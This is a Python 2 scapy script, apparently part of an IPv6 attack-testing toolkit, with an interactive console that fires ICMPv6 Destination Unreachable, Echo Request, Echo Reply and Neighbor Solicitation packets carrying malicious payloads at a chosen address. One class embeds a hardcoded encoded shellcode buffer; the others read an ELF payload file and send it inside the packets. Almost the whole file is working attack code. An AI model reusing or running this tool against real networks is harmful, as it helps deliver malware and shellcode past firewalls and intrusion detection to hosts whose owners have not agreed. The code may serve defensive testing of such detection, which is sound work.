#!/usr/bin/python

import sys
import re, uuid
import os
import readline
from pprint import pprint
from commands import *
from scapy.all import *
from receiver import *
from bitstring import *

"""
This class is for testing all attacking channels in one
"""
class AllAttackingTests:

    def __init__(self, iface):
        self.ipAddress = '2001:db8:acad:2::2'
        self.iface = iface
        self.name = 'AllAttackingTests'
        self.path = 'payloads/testElf'

    def startSystem(self):
        Commands.setAllAttackingTestHistory()
        running = 1
        while running:
            readline.parse_and_bind("tab: complete")
            #we receive data from the keyboard                    
            command  = raw_input(self.name + ' >>')
            #help command
            if re.match('help', command):
                self.showHelp()
            #quit module command
            elif re.match('quit', command):
                running = 0
                Commands.setCovertChannelHistory()
            elif re.match('setAdr', command):
                self.ipAddress = re.sub('setAdr', ' ', command).lstrip()
                print 'setting Ip address: ' + self.ipAddress
            #execution of all tests
            elif re.match('exec', command):
                dest = DestinationUnreachableMalPayloadLinux(self.path)
                dest.execModule(self.iface, self.ipAddress)
                echoReq = EchoRequestMalPayloadLinux(self.path)
                echoReq.execModule(self.iface, self.ipAddress)
                echoReply = EchoReplyMalPayloadLinux(self.path)
                echoReply.execModule(self.iface, self.ipAddress)
                neighbSol = NeighborSolicitationMalPayloadLinux(self.path)
                neighbSol.execModule(self.iface, self.ipAddress)
                
    def showHelp(self):
        for entry in Help.getAllAttackingTestHelp():
            print entry


"""
the class build destination unreachable messages with malicious payload for linux
"""
class DestinationUnreachableMalPayloadLinux:
    
    def __init__(self, path):
        print 'Attacking Dest Unreach'
        self.path = path
        self.buf =  ""
        self.buf += "\xdd\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x14\xbd\x4b"
        self.buf += "\xa8\x1a\xfe\x83\xc2\x04\x31\x6a\x14\x03\x6a\x5f\x4a"
        self.buf += "\xef\xcf\x84\xd9\x53\x63\x50\xd4\xda\x62\xce\x8e\x84"
        self.buf += "\xa9\x8e\xd9\xac\x5a\x8e\xe5\xce\x9a\xe6\xe5\xce\x9a"
        self.buf += "\xe6\x8d\xce\x9a\x06\x4e\xa7\x36\xab\x4e\x35\x2f\x93"
        self.buf += "\x4f\x34\x17\x81\x29\x2e\x66\x9e\xd0\xc6\x62\xe0\x95"
        self.buf += "\xf6\x19\xfc\xf4\xae\x54\x1d\xb5\x0d\x0d\xbb\x62\x5f"
        self.buf += "\x51\xca\x60\xe9\x5e\x7c\x85\xdb\xdf\xf5\x55\x1c\x3e"

        
    def buildPacket(self, ipAdr):
        data = open(self.path.strip(), 'rb')
        self.payload = data.read()
        data.close()
        self.packetCode0 = IPv6(dst=ipAdr)/ICMPv6DestUnreach(code=0)/self.buf
        
    def execModule(self, exitIface, ipAdr):
        self.buildPacket(ipAdr)
        send(self.packetCode0, iface=exitIface, verbose=False)



class EchoRequestMalPayloadLinux:
    
    def __init__(self, path):
        print 'Attacking Echo Request'
        self.path = path
        
    def buildPacket(self, ipAdr):
        data = open(self.path.strip(), 'rb')
        self.payload = data.read()
        data.close()
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(data=self.payload)
        
    def execModule(self, exitIface, ipAdr):
        self.buildPacket(ipAdr)
        send(self.packet, iface=exitIface, verbose=False)
        
class EchoReplyMalPayloadLinux:
    
    def __init__(self, path):
        print 'Attacking Echo Reply'
        self.path = path

    def buildPacket(self, ipAdr):
        data = open(self.path.strip(), 'rb')
        self.payload = data.read()
        data.close()
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(data=self.payload)
        
    def execModule(self, exitIface, ipAdr):
        self.buildPacket(ipAdr)
        send(self.packet, iface=exitIface, verbose=False)


class NeighborSolicitationMalPayloadLinux:
    
    def __init__(self, path):
        print 'Attacking Neighbor Solicitation'
        self.path = path

    def buildPacket(self, ipAdr):
        data = open(self.path.strip(), 'rb')
        self.payload = data.read()
        data.close()
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS()/self.payload
        
    def execModule(self, exitIface, ipAdr):
        self.buildPacket(ipAdr)
        send(self.packet, iface=exitIface, verbose=False)




